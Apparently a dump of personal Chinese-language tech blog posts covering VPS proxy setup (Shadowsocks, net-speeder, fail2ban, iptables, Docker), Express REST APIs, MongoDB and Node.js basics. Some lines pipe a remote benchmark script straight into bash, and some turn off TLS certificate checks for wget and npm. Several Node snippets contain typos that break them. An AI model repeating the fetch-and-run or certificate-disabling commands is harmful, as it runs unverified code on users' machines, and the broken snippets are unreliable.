rule里面，可以看下哪些ip被拉黑了iptables -L -n ## 查看已添加的iptables规则 2.2 SSR 以及一些衍生的软件ShadowsocksR启动后台运行命令 python server.py -p 443 -k password -m aes-256-cfb -O auth_sha1_v4 -o http_simple -d start net-speeder apt-get install libnet1-devapt-get install libpcap0.8-dev venetX，OpenVZ 架构 cd net-speeder-master/ sh build.sh -DCOOKED ###Xen，KVM，物理机 cd net-speeder-master/ sh build.sh ### 加速所有ip协议数据 ./net_speeder venet0 &quot;ip&quot; ###只加速指定端口，例如只加速TCP协议的 8989端口, 切换到net-speeder的目录下 ./net_speeder venet0:0 &quot;tcp src port 8989&quot; ./net_speeder venet0 &quot;ip&quot; net-speeder写入开机脚本 2.3 升级内核开启 BBRKVM 架构升级内核开启 BBR ubuntu 16.4 安装 shadowsocks-libev 参考 github官方教程安装 sudo apt-get install software-properties-common -y sudo add-apt-repository ppa:max-c-lv/shadowsocks-libev -y sudo apt-get update sudo apt install shadowsocks-libev apt-get install --only-upgrade &lt;packagename&gt; ## 只更新这一个程序 apt list --upgradable ## 看一下哪些程序可以更新 # Edit the configuration file sudo vi /etc/shadowsocks-libev/config.json ## 这里记得把server address改成实际的ip # Edit the default configuration for debian sudo vi /etc/default/shadowsocks-libev # Start the service sudo /etc/init.d/shadowsocks-libev start # for sysvinit, or sudo systemctl start shadowsocks-libev # for systemd ##加入开机启动 ##在/etc/rc.local中加入 sudo /etc/init.d/shadowsocks-libev start sudo ss-server -c /etc/shadowsocks-libev/config.json -u ## 开启udp转发 netstat -lnp确认ss-server确实监听了udp端口 其实跟安装 ss 很像的用iptables限制到shadowsocks端口的最大连接数 # Up to 32 connections are enough for normal usage iptables -A INPUT -p tcp --syn --dport ${SHADOWSOCKS_PORT} -m connlimit --connlimit-above 32 -j REJECT --reject-with tcp-reset 2.4 安装libsodium转自逗比 ## debian系列 apt-get update ## 安装 编译所需组件包： apt-get install -y build-essential ### 获取 libsodium最新版本： Libsodiumr_ver=$(wget -qO- &quot;https://github.com/jedisct1/libsodium/tags&quot;|grep &quot;/jedisct1/libsodium/releases/tag/&quot;|head -1|sed -r &#39;s/.*tag\\/(.+)\\&quot;&gt;.*/\\1/&#39;) &amp;&amp; echo &quot;${Libsodiumr_ver}&quot; ## 下载最新 libsodium版本编译文件： wget --no-check-certificate -N &quot;https://github.com/jedisct1/libsodium/releases/download/${Libsodiumr_ver}/libsodium-${Libsodiumr_ver}.tar.gz&quot; tar -xzf libsodium-${Libsodiumr_ver}.tar.gz &amp;&amp; cd libsodium-${Libsodiumr_ver} ./configure --disable-maintainer-mode &amp;&amp; make -j2 &amp;&amp; make install ## 这段最好sudo 去做 ldconfig ## 删掉之前下载的文件 cd .. &amp;&amp; rm -rf libsodium-${Libsodiumr_ver}.tar.gz &amp;&amp; rm -rf libsodium-${Libsodiumr_ver} 现在就可以去config.json文件中将加密方式改成: chacha20 了，重启下ss即可 2.5 查看日志日志文件的位置在/var/log/shadowsocks.log下面这条命令用于查看访问了哪些网站cat shadowsocks.log | awk ‘{ print $5}’ |grep -o ‘^[^:]*’ | sort | uniq -c | sort -n 查看尝试连接本服务器的客户端cat shadowsocks.log | awk ‘{ print $NF }’| grep -o ‘^[^:]*’ | sort | uniq -c | sort -n 2.6 simple-obfssudo apt-get install simple-obfs/etc/shadowsocks-libev/config.json文件中添加 &quot;plugin&quot;:&quot;obfs-server&quot;, &quot;plugin_opts&quot;: &quot;obfs=tls;obfs-host=www.bing.com&quot;, &quot;fast_open&quot;:true, &quot;reuse_port&quot;:true 2.7 ss-local提供正向代理curl使用代理，在ss-local监听1080端口的前提下，这条命令可以正常访问google curl -4sSkL -x socks5h://127.0.0.1:1080 https://www.google.comcurl –socks5 127.0.0.1:1080 http://stackoverflow.com/ //这个更简单 有两种方式 $ export http_proxy=”vivek:myPasswordHere@10.12.249.194:3128/“$ curl -v -O http://dl.cyberciti.biz/pdfdownloads/b8bf71be9da19d3feeee27a0a6960cb3/569b7f08/cms/631.pdf curl -x ‘http://vivek:myPasswordHere@10.12.249.194:3128‘ -v -O https://dl.cyberciti.biz/pdfdownloads/b8bf71be9da19d3feeee27a0a6960cb3/569b7f08/cms/631.pdf 如何让 curl 命令通过代理访问curl -x socks5://[user:password@]proxyhost[:port]/ urlcurl –socks5 192.168.1.254:3099 https://www.cyberciti.biz/ ss各种加密算法跑分测试首先安装iperfapt-get install iperfiperf.sh #!/bin/bash method=$1 ss-tunnel -k test -m $method -l 8387 -L 127.0.0.1:8388 -s 127.0.0.1 -p 8389 &amp; ss_tunnel_pid=$! ss-server -k test -m $method -s 127.0.0.1 -p 8389 &amp; ss_server_pid=$! iperf -s -p 8388 &amp; iperf_pid=$! sleep 3 iperf -c 127.0.0.1 -p 8387 kill $ss_tunnel_pid kill $ss_server_pid kill $iperf_pid echo &quot;Test Finished&quot; 3. ubuntu自带的防火墙叫做ufw(Uncomplicated Firewall)，用起来也很简单digital ocean的ufw教程 4.跑分VPS 跑分软件git clone 下来 cd across wget -qO- bench.sh | bash ###（亲测可用，也可以自己看Readme） ### 或者 curl -Lso- bench.sh | bash 下面是一些自己试过的 BandWagon---------------------------------------------------------------------- CPU model : Intel(R) Xeon(R) CPU E3-1275 v5 @ 3.60GHz Number of cores : 1 CPU frequency : 3600.041 MHz Total size of Disk : 12.0 GB (10.0 GB Used) Total amount of Mem : 256 MB (217 MB Used) Total amount of Swap : 128 MB (122 MB Used) System uptime : 2 days, 4 hour 20 min Load average : 0.06, 0.05, 0.01 OS : Ubuntu 14.04.1 LTS Arch : i686 (32 Bit) Kernel : 2.6.32-042stab123.3 ---------------------------------------------------------------------- I/O speed(1st run) : 855 MB/s I/O speed(2nd run) : 1.0 GB/s I/O speed(3rd run) : 1.0 GB/s Average I/O speed : 967.7 MB/s ---------------------------------------------------------------------- Node Name IPv4 address Download Speed CacheFly 205.234.175.175 76.5MB/s Linode, Tokyo, JP 106.187.96.148 17.6MB/s Linode, Singapore, SG 139.162.23.4 8.18MB/s Linode, London, UK 176.58.107.39 8.67MB/s Linode, Frankfurt, DE 139.162.130.8 12.8MB/s Linode, Fremont, CA 50.116.14.9 9.40MB/s Softlayer, Dallas, TX 173.192.68.18 62.3MB/s Softlayer, Seattle, WA 67.228.112.250 66.0MB/s Softlayer, Frankfurt, DE 159.122.69.4 12.2MB/s Softlayer, Singapore, SG 119.81.28.170 11.8MB/s Softlayer, HongKong, CN 119.81.130.170 13.2MB/s ---------------------------------------------------------------------- BuyVmCPU model : Intel(R) Xeon(R) CPU L5639 @ 2.13GHz Number of cores : 1 CPU frequency : 2000.070 MHz Total size of Disk : 15.0 GB (1.3 GB Used) Total amount of Mem : 128 MB (80 MB Used) Total amount of Swap : 128 MB (32 MB Used) System uptime : 0 days, 22 hour 28 min Load average : 0.10, 0.04, 0.05 OS : Ubuntu 14.04.2 LTS Arch : i686 (32 Bit) Kernel : 2.6.32-openvz-042stab116.2-amd64 ---------------------------------------------------------------------- I/O speed(1st run) : 102 MB/s I/O speed(2nd run) : 97.1 MB/s I/O speed(3rd run) : 147 MB/s Average I/O speed : 115.4 MB/s ---------------------------------------------------------------------- Node Name IPv4 address Download Speed CacheFly 205.234.175.175 14.7MB/s Linode, Tokyo, JP 106.187.96.148 6.15MB/s Linode, Singapore, SG 139.162.23.4 2.54MB/s Linode, London, UK 176.58.107.39 2.99MB/s Linode, Frankfurt, DE 139.162.130.8 2.96MB/s Linode, Fremont, CA 50.116.14.9 4.27MB/s Softlayer, Dallas, TX 173.192.68.18 11.7MB/s Softlayer, Seattle, WA 67.228.112.250 13.0MB/s Softlayer, Frankfurt, DE 159.122.69.4 1.89MB/s Softlayer, Singapore, SG 119.81.28.170 3.26MB/s Softlayer, HongKong, CN 119.81.130.170 3.72MB/s ---------------------------------------------------------------------- DigitalOcean Los Angeles---------------------------------------------------------------------- CPU model : Intel(R) Xeon(R) CPU E5-2650L v3 @ 1.80GHz Number of cores : 1 CPU frequency : 1799.998 MHz Total size of Disk : 20.2 GB (1.0 GB Used) Total amount of Mem : 488 MB (33 MB Used) Total amount of Swap : 0 MB (0 MB Used) System uptime : 0 days, 0 hour 3 min Load average : 0.16, 0.10, 0.03 OS : Ubuntu 16.04.2 LTS Arch : x86_64 (64 Bit) Kernel : 4.4.0-78-generic ---------------------------------------------------------------------- I/O speed(1st run) : 581 MB/s I/O speed(2nd run) : 711 MB/s I/O speed(3rd run) : 777 MB/s Average I/O speed : 689.7 MB/s ---------------------------------------------------------------------- Node Name IPv4 address Download Speed CacheFly 205.234.175.175 161MB/s Linode, Tokyo, JP 106.187.96.148 15.7MB/s Linode, Singapore, SG 139.162.23.4 5.96MB/s Linode, London, UK 176.58.107.39 5.71MB/s Linode, Frankfurt, DE 139.162.130.8 6.45MB/s Linode, Fremont, CA 50.116.14.9 30.4MB/s Softlayer, Dallas, TX 173.192.68.18 29.9MB/s Softlayer, Seattle, WA 67.228.112.250 57.7MB/s Softlayer, Frankfurt, DE 159.122.69.4 3.64MB/s Softlayer, Singapore, SG 119.81.28.170 7.59MB/s Softlayer, HongKong, CN 119.81.130.170 8.84MB/s ---------------------------------------------------------------------- DigitalOcean Sinapore (ip address lokks like Russian)---------------------------------------------------------------------- CPU model : Intel(R) Xeon(R) CPU E5-2630L 0 @ 2.00GHz Number of cores : 1 CPU frequency : 1999.999 MHz Total size of Disk : 20.2 GB (1.0 GB Used) Total amount of Mem : 488 MB (36 MB Used) Total amount of Swap : 0 MB (0 MB Used) System uptime : 0 days, 0 hour 2 min Load average : 0.17, 0.20, 0.09 OS : Ubuntu 16.04.2 LTS Arch : x86_64 (64 Bit) Kernel : 4.4.0-78-generic ---------------------------------------------------------------------- I/O speed(1st run) : 662 MB/s I/O speed(2nd run) : 741 MB/s I/O speed(3rd run) : 728 MB/s Average I/O speed : 710.3 MB/s ---------------------------------------------------------------------- Node Name IPv4 address Download Speed CacheFly 205.234.175.175 20.8MB/s Linode, Tokyo, JP 106.187.96.148 18.6MB/s Linode, Singapore, SG 139.162.23.4 83.8MB/s Linode, London, UK 176.58.107.39 5.71MB/s Linode, Frankfurt, DE 139.162.130.8 8.13MB/s Linode, Fremont, CA 50.116.14.9 2.82MB/s Softlayer, Dallas, TX 173.192.68.18 6.18MB/s Softlayer, Seattle, WA 67.228.112.250 8.47MB/s Softlayer, Frankfurt, DE 159.122.69.4 6.77MB/s Softlayer, Singapore, SG 119.81.28.170 97.9MB/s Softlayer, HongKong, CN 119.81.130.170 35.2MB/s ---------------------------------------------------------------------- 跑java？算了吧，简单读个文本文件print出来cpu就飙到50%。安装jdk的话sudo apt install openjdk-8-jdk //只装这个的话在intelij里面是看不了jdk源码的sudo apt install openjdk-8-source //这样就能在linux desktop的intelij里面看jdk源码了 5. 关于 dockerdocker image 是snapshot, 而container是docker image的运行实例 youtube 上有人在 Digital Ocean 的 vps 上安装 docker，主要作用就是将一个复杂的操作系统打包成一个下载即用的容器。进入容器中，可以像在实际的操作系统中一样运行指令。所以虚拟化的机器随时可以使用其他操作系统。how-to-install-and-use-docker-on-ubuntu-16-04用docker host一个node js app。实测下来image大小在600MB左右，内存占用200MB左右。 docker常用的命令有那么几条 docker run hello-worlddocker search ubuntudocker pull ubuntudocker run ubuntu ## 进入ubuntu这个containerdocker imagesdocker run -it ubuntuexit 这两条命令用于自己在本地打一个docker imagedocker build -t /node-web-app .docker build -t packsdkandroiddocker.image -f ./scripts/PackSdkDockerfile . 注意你修改了Dockerfile之后要重新跑一遍docker build -t /node-web-app .每次修改之后重新打image docker会在/var/lib/docker文件夹里吃掉大量空间，释放空间的话 docker system prune -a 用docker运行一个node mongodb应用 亲测有效node的官方image太大了，alpine-node占用的磁盘空间更小 docker run -p 3000:3000 -ti dummy-app ## 每次都需要输入一大段命令行参数很烦人的，所以把配置写在一个docker-compose.yml文件里面，每次只需要docker-compose up就可以了。 使用textmate在vscode中编辑远程linux server中的文件 关于ubuntu添加ppadebian系的package management方式.ppa(personal package archives)添加ppa的方式 sudo add-apt-repository ppa:owner_name/ppa_name Dnsmasq vps自建DNS服务器tips onserver optimization 参考vps 优化 egrep -e “via tcp:xxx.xxx.xxx:[0-9]{5}$” -o client_debug.log | sed “s/via tcp:xxx.xxx.xxx://g” | sort | uniq -c | sort -k 1 -nregrep 和sed 命令的使用 egrep 的使用（偏向正则表达式方面）cat stuff.log 2018/9/15 01:52:26 udp:123.123.123.123:35021 accepted tcp:api-dash.ins.io:4432018/9/15 01:52:27 udp:123.123.123.123:29932 accepted tcp:www.google-analytics.com:4432018/9/15 01:52:28 udp:123.123.123.123:35283 accepted tcp:notifications.google.com:4432018/9/15 01:52:29 udp:123.123.123.123:29932 accepted tcp:fonts.gstatic.com:443 sudo egrep “udp:123.123.123.123:[0-9]{5}” -o stuff.logudp:123.123.123.123:35021udp:123.123.123.123:29932udp:123.123.123.123:35283udp:123.123.123.123:29932 中括号的意思是0-9之间的任一数字，花括号包起来的5表示重复5次，也就是五位数的意思了 6. fail2ban的使用照着digitalocean上的教程配置就行了 本质上都是某个ip触犯了某条规则，就被iptable添加到drop里面。所以对于发起请求的人来说，看到的是connection refused。对于服务器这边，nginx的日志里都没有。因为ip包还没有到nginx就被拦住了。日志在/var/log/fail2ban.log这里iptables -nLsudo service fail2ban restart ##重启一下让规则生效sudo fail2ban-client status ## 看下我都添加了哪些规则sudo iptables -S ##看下fail2ban都添加了哪些iptable规则sudo fail2ban-client status nginx-http-auth ##看看撞上这个规则的ip有哪些ipsudo fail2ban-client set nginx-http-auth unbanip 111.111.111.111 ##把这条规则放出小黑屋 sudo fail2ban-client reload ## Reloads Fail2ban’s configuration files.在restart之前先用这个测试一下配置文件是否写错了sudo fail2ban-client start ##Starts the Fail2ban server and jails.sudo fail2ban-client status ##Will show the status of the server, and enable jails.sudo fail2ban-client status nginx-http-auth ## 哪些ip被这个规则ban了 ##还可以手动测试正则是否符合fail2ban-regex ‘string’ ‘regex’ //上面的jail也是用了filter.d里面的正则 fail2ban防止ddos fail2ban保护shadowsocks fail2ban-regex fail2ban-regex fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf –print-all-matched–print-all-missed–print-all-ignored sudo fail2ban-regex /var/log/nginx/access.log /etc/fail2ban/filter.d/nginx-x00.conf –print-all-matched 匹配成功| 139.162.184.185 - - [29/Oct/2018:20:02:19 -0400] “\\x15\\x03\\x03\\x00\\x02\\x01\\x00” 400 166 “-“ “-“ iperf是linux下的一个tcp测速软件 vps挂下载。注意transmission每次修改设置文件sudo vim /etc/transmission-daemon/settings.json之前要先把transmission这个进程关掉，不然设置文件会被修改。另外，设置文件中显示的rpc-password其实是hash之后的值，记住自己实际上写了什么就好。 base64的用法 base64 -d &lt;(curl -L -s https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt) 参考国外的超级ping快速检测 IP 地址是否可用路由器透明代理dnsmasqshadowsocks-libev fail2ban reg访问没有被封的国外网站所使用的IP","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"使用Node和express开发Restful API","date":"2017-12-10T16:20:16.000Z","path":"2017/12/10/2017-12-10-Restful-API-Prescription-with-node-express/","text":"一个最简单的express app如下： var express = require(&#39;express&#39;); var app = express(); app.get(&#39;/&#39;, function(req, res){ res.send(&#39;hello world&#39;); }); app.listen(3000); 1. 安装 yarn add express body-parser 2. 配置MiddleWare(中间件)的概念：从Request到response之间的流程中，任何组件都可以对这个过程中的数据进行修改，所以router其实也是中间件。中间件需要注意的就是顺序很重要。 2.1 路由设置var router = express.Router([options]);//首先创建router对象，默认urlpath是大小写不敏感的 router.use(&quot;/api&quot;,function(req,res){ return &quot;hey there&quot;; }); //所以这个router会默认处理所有/api开头的请求，但是在这个router内部还是分的清的 router.get(&quot;/&quot;,...) router.get(&quot;/detail&quot;,...) // 上面的例子，router会匹配上所有/api开头的url， app.use(&#39;/apple&#39;, ...) will match “/apple”, “/apple/images”, “/apple/images/news”, and so on. app.use(function (req, res, next) { //path默认是&#39;/&#39;，所以下面这个router会匹配上所有的请求 console.log(&#39;Time: %d&#39;, Date.now()); next(); }); //明确区分get和post router.get(&#39;/&#39;, function(req, res, next)) { }; router.post(&#39;/&#39;,function(req,res,next)){ }; router.all() //这种是所有的HTTP METHOD都接受的 2.2 body-parser一般这样使用就行了,bodyParser只是指明了能够parse那些content-type的request body // parse application/x-www-form-urlencoded app.use(bodyParser.urlencoded({ extended: false })) // parse application/json app.use(bodyParser.json()) 添加了bodyParser之后就能获取客户端传来的数据了 获取GET请求的参数比如 GET /student/getById/27 这样一个get请求 app.get(&#39;/getById/:age&#39;,function(req,res){ res.send(req.params.age); }) 获取POST请求的参数在postMan发起post请求```configPOST /api/personal?age=10 HTTP/1.1Host: localhost:8080Content-Type: application/x-www-form-urlencodedCache-Control: no-cachePostman-Token: 79c6d9a1-de8d-3b0b-8d3d-0ed6e1910f69 name=Josn&amp;age=12 POST请求中的body数据从req.body中拿就好了 ```js req.params // Object ，Json.String = {} req.body // {name:&#39;Josn&#39;,age:&#39;12&#39;} //这个是post里面发送的body数据 req.query // {&quot;age&quot;,&quot;10&quot;} // 显然这是url里面的query 获取请求头req.header(headerName)console.log(JSON.stringify(req.headers)); 2.3 处理response可以设置header什么的 /* GET /api/user */ much extra information you can set on its header app.get(&quot;/user&quot;,function (req,res) { res.set({ &#39;Content-Type&#39;: &#39;application/json&#39;, &#39;Content-Length&#39;: &#39;123&#39;, &#39;ETag&#39;: &#39;12345&#39;, &#39;Cache-Control&#39;: &#39;max-age=5&#39;, &quot;Access-Control-Allow-Origin&quot;: &#39;http://127.0.0.1:8080&#39; }); res.cookie(&#39;name&#39;, &#39;tobi&#39;, { domain: &#39;.example.com&#39;, path: &#39;/admin&#39;, secure: true }); console.log(&#39;response send&#39;); res.json({ &quot;name&quot;:&quot;John&quot;, &quot;age&quot;:10 }); }); 可以直接一个404打回去res.sendStatus(404) 还可以重定向response.redirect(‘/all’); //在浏览器里面看，response的header是这样的 HTTP/1.1 302 FoundX-Powered-By: ExpressLocation: /allVary: AcceptContent-Type: text/html; charset=utf-8Content-Length: 68Date: Sun, 14 Jan 2018 10:08:50 GMTConnection: keep-alive response.direction();和window.location.href差不多 在router中主要就是业务逻辑处理了，在所有的需要认证的接口前添加jwt鉴权处理，使用三个函数的方法，例如 var jwt = require(&#39;express-jwt&#39;); app.get(&#39;/protected&#39;, jwt({secret: &#39;shhhhhhared-secret&#39;}), function(req, res) { if (!req.user.admin) return res.sendStatus(401); res.sendStatus(200); }); 在业务处理中使用Promise router.get(&#39;/&#39;, auth.optional, function(req, res, next) { Promise.all([promise1,promise2]) .then(values =&gt; { return res.json({key1:values}); }).catch(next); } 2.4 错误处理四个参数 app.use(function(err, req, res, next) { console.error(err.stack); res.status(500).send(&#39;Something broke!&#39;); }); 3 Serving static files照说serving static file这种事应该交给nginx类似的反向代理来做，express只是提供了一种选择。 app.use(express.static(path.join(__dirname,&#39;public&#39;))) 然后在当前目录新建一个public文件夹，添加img文件夹，里面放一张porn.jpg。浏览器访问： localhost:port/img/porn.jpg 。 就能看到放进去的的那张图片了。 app.use(&#39;/jquery&#39;, express.static(__dirname + &#39;/node_modules/jquery/dist/&#39;)); app.use(express.static(__dirname + &#39;/public&#39;)); //这样的语法也可以 这意思就是请求/jquery这个目录下的资源就等于访问/node_modules/jquery/dist/目录下同名的资源 express4.x的文档上还有详尽的设置: var options = { dotfiles: &#39;ignore&#39;, etag: false, extensions: [&#39;htm&#39;, &#39;html&#39;], index: false, maxAge: &#39;1d&#39;, redirect: false, setHeaders: function (res, path, stat) { res.set(&#39;x-timestamp&#39;, Date.now()) } } app.use(express.static(&#39;public&#39;, options)) 4. 数据库连接mongoose是连接node和mongodb的库，官方文档 const mongoose = require(&#39;mongoose&#39;); mongoose.connect(&#39;mongodb://localhost/test&#39;); const Cat = mongoose.model(&#39;Cat&#39;, { name: String }); const kitty = new Cat({ name: &#39;Zildjian&#39; }); kitty.save().then(() =&gt; console.log(&#39;meow&#39;)); 看上去查询和promise有点像，但不要当做Promise 简单的session处理: yarn add express cookie-parser express-session router.get(&quot;/&quot;, function(req, res, next) { if (req.session.user) { var user = req.session.user; var name = user.name; res.send(&quot;你好&quot; + name + &quot;，欢迎来到我的家园。&quot;); } else { let user = { name: &quot;Chen-xy&quot;, age: &quot;22&quot;, address: &quot;bj&quot; }; req.session.user = user; res.send(&quot;你还没有登录，先登录下再试试！&quot;); } // res.render(&quot;index&quot;, { // title: &quot;the test for nodejs session&quot;, // name: &quot;sessiontest&quot; // }); }); 5. Deploying node app on linux server在linux server上使用pm2 deploy node project nohup node /home/zhoujie/ops/app.js &amp; ## nohup就是不挂起的意思( no hang up)。 ignoring input and appending output to nohup.out // 输出被写入当前目录下的nohup.out文件中 screen ## 新开一个screen pm2npm install -g pm2pm2 start app.js Configure Nginx as a web server and reverse proxy for Nodejs application on AWS Ubuntu 16.04 server real world express backend server用swagger ui写后端api文档，极度简单 参考Nginx 是前端工程师的好帮手 Express Api book在NodeJs中玩转protoBuffer","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"MongoDB手册","date":"2017-12-10T16:13:54.000Z","path":"2017/12/10/2017-12-10-MongoDB-recepies/","text":"MongoDB可以作为Spring boot的数据库DAO，也可以和node平台的express module结合。作为后台开发的数据库，应用很广。 安装(windows平台下)MongoDB默认装到C盘的program files文件夹里面,需要一个data文件夹official on installation这个文件夹不一定要在c盘，可以放f盘，比如”f://mongndb//data”//这样启动server时记得把–dbpath传一下默认安装的时候dbpath被设置为了”c://data//db”，所以可能需要创建这个目录 windows上如果作为一项服务的话，每次都会开机自启，关闭方式 Go to your windows services.msc and set your mongoDB on manual. To start your DB open admin prompt net start mongodb. To stop it net stop mongodb. establish connection// start db server &quot;C:\\Program Files\\MongoDB\\Server\\3.4\\bin\\mongod.exe&quot; --dbpath d:\\test\\mongodb\\data // open another shell window to connect to server &quot;C:\\Program Files\\MongoDB\\Server\\3.4\\bin\\mongo.exe&quot; // then you can start interact with mongo db server 速查手册Tutorial, not officialMongoose教程官方手册Mongoose CURD支持多种语言环境调用mongodb api 语法(不像mysql后面要跟一个;分号,mongo shell并不要求)： ```rubyuse mydb ## 创建一个名mydb的数据库db.createCollection(“students”) ## 创建一个students的collections(类似于sql的table)show databases ##显示当前系统中所有dbshow collections ## 显示当前数据库中的所有collectionsdb.students.insert({name: ‘Json’,age: 22,title:[‘teacher’,’professor’,’versatile’]}) ## 往数据库里添加一条数据db.students.find().pretty() // 显示students的collection中的所有元素，pretty只是好看点db.students.updateOne( { “name”: “Bob” }, { $set: {“age” : 99}} ); // UPDATE语句 setdb.students.find( { age : { $gt:24, $lt: 28} } ) // QUERY 语句 greater than and less thandb.students.deleteOne( { “_id” : ObjectId(“5a584a109f157d455472ff11”) } ); // DELETE 语句 batchInserttry { db.products.insertMany( [ { item: “card”, qty: 15 }, { item: “envelope”, qty: 20 }, { item: “stamps” , qty: 30 } ] );} catch (e) { print (e);} ## 在node环境下可以使用 Mongoose // a wrapper around the mongo db interface schema definition ```js // correct var studentSchema = mongoose.Schema({ _id: String, name: String, age: Number }); // wrong var studentSchema = mongoose.Schema({ name: String, age: Number }); 在linux上安装mongodb-server会占用200多MB的磁盘空间，原因是db使用了journal file，但这种journal 要区别于实际的文件，并未写入实际的文件存储具体的文件名字好像叫WiredTigerLog什么的是这么找出来的 sudo find / -size +10M -exec du -h {} \\; | sort -n ===========================================================================// todo validate request data, error handling. Uploading Files to MongoDB With GridFS (Node.js App)","tags":[]},{"title":"nodejs学习记录","date":"2017-12-10T16:13:30.000Z","path":"2017/12/10/2017-12-10-node-js-cookbook/","text":"npm run start 安装windows上的安装十分方便，就跟安装普通软件一样，一路下一步点下去即可。 npm install -g grunt –save-dev # 安装，成为全局(-g)module，保存为dev-dependencies(–save-dev) 简写 -D 一个意思npm install -g grunt –save # 安装，保存为dependencies npm run dev # 打开发环境包npm run build # 打release包node is based on chrome v8 engine,it’s javaScript without the browser. npm的configuration非常方便设置,首先是设置proxy npm config set strict-ssl falsenpm config set registry “http://registry.npmjs.org/“npm config set proxy http://127.0.0.1:1080 ## 以上三句话设置代理npm config list ##列出当前所有的设置npm config get stuff ##比如说registry等等 也有用淘宝cnpm的做法: $ npm install -g cnpm –registry=https://registry.npm.taobao.org$ npm config set registry https://registry.npm.taobao.org$ cnpm install [name] ## 这样就能安装了 whats-the-difference-between-dependencies-devdependencies-and-peerdependenciesnpm有个dependencies的概念，此外还有dev-dependencies的概念，主要看package.json这个文件 { &quot;name&quot;: &quot;foo&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;scripts&quot;: { &quot;dev&quot;: &quot;node build/dev-server.js&quot;, &quot;build&quot;: &quot;node build/build.js&quot;, &quot;test&quot;: &quot;&quot;, &quot;lint&quot;: &quot;eslint --ext .js,.vue src test/unit/specs test/e2e/specs&quot; }, &quot;dependencies&quot;: { &quot;axios&quot;: &quot;^0.15.3&quot;, &quot;jsonp&quot;: &quot;^0.2.1&quot; }, &quot;devDependencies&quot;: { &quot;webpack&quot;: &quot;^2.6.1&quot;, &quot;webpack-dev-middleware&quot;: &quot;^1.10.0&quot;, &quot;webpack-hot-middleware&quot;: &quot;^2.18.0&quot;, &quot;webpack-merge&quot;: &quot;^4.1.0&quot; } } /*script的意思是输入npm run dev = node build/dev-server.js 类似于 linux下的alias*/ /*向上箭头的意思是安装的时候会自动去查找安装最新的minor version。关于版本号，第一位表示major version，may incur code imcompatibility,第二位表示minor version，代表new features,第三位表示bug fixes.所以向上箭头意味着安装时不会动第一位，只会升级为第二位最新的版本*/ stackoverflow上的解释 示例app.js console.log(&#39;hello!&#39;); node app.jshello! 创建node project npm init会提示一些信息，生成一个package.json文件 { &quot;name&quot;: &quot;test&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; } main是指程序的运行入口script是指可以自己设置启动的命令，有点像alias比如 vue-cli的package.json里面就是这样的 “dev”: “node build/dev-server.js”,“build”: “node build/build.js” 所以用户只要输入 npm run dev就等同于node build/dev-server.js const = require(&#39;http&#39;); // http is a core module ,so we do&#39;t need install const hostname = &#39;127.0.0.1&#39;; const port = 3000; cost server = http.createServer((req,res) =&gt; { res.statusCode = 200; res.setHeader(&#39;Content-type&#39;,&#39;text/plain&#39;); res.end(&#39;Hello there!&#39;); }); server.listen(port,hostname,() =&gt;{ console.log(&#39;Server started on port &#39;+ port); }) 此时去浏览器中打开’localhost:3000’，会返回’Hello there!’ 想要返回一个html并在浏览器中渲染，ctrl+c停止服务器，修改代码如下。 const http = require(&#39;http&#39;); const fs =require(&#39;fs&#39;); const hostname = &#39;127.0.0.1&#39;; const port = 3000; fs.readFile(&#39;index.html&#39;,(err,html) =&gt; { if (err) { throw err; } const server = http.createServer((req,res) =&gt; { res.statusCode = 200; res.setHeader(&#39;Content-type&#39;,&#39;text/html&#39;); res.write(html); res.end(); }); server.listen(port,hostname,() =&gt;{ console.log(&#39;Server started on port &#39;+ port); }) }) 现在重新运行node index，打开浏览器，在3000端口就能看到html网页了。 { &quot;name&quot;: &quot;api&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;app.js&quot;, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: { &quot;body-parser&quot;: &quot;^1.18.2&quot; } } dependencies里面向上箭头表示安装最新的minor version。而使用”*“号的话就表示想要使用latest version 一些node自带的module比如fs,path,http，这些东西都是不需要安装的,bundled with node installation。 path.join(__dirname,&#39;filename&#39;); // ./filename path.join(__dirname,&quot;..&quot;,filename); // ../filename ,go to parent directory Compile ES6 ES2017 Code to ES5 Code(这部分属于webpack的内容) npm install –save-dev webpack webpack-dev-server babel-core babel-loader babel-preset-envnpm install –save-dev babel-polyfill babel-preset-stage-0 ## 用async await的话需要安装polyfill package.json { &quot;name&quot;: &quot;bable-assemble&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;build&quot;: &quot;webpack&quot;, &quot;start&quot;: &quot;webpack-dev-server --output-public-path=/build/&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: { &quot;babel-cli&quot;: &quot;^6.26.0&quot;, &quot;babel-core&quot;: &quot;^6.26.0&quot;, &quot;babel-loader&quot;: &quot;^7.1.2&quot;, &quot;babel-polyfill&quot;: &quot;^6.26.0&quot;, &quot;babel-preset-env&quot;: &quot;^1.6.1&quot;, &quot;babel-preset-es2015&quot;: &quot;^6.24.1&quot;, &quot;babel-preset-stage-0&quot;: &quot;^6.24.1&quot;, &quot;http-server&quot;: &quot;^0.10.0&quot;, &quot;webpack&quot;: &quot;^3.10.0&quot;, &quot;webpack-dev-server&quot;: &quot;^2.9.7&quot; } } output的文件夹名有些人喜欢叫dist，有些人用build。都行，没有区别的。 如果手动敲webpack的话，会提示你找不到webpack，这是因为没有globally install 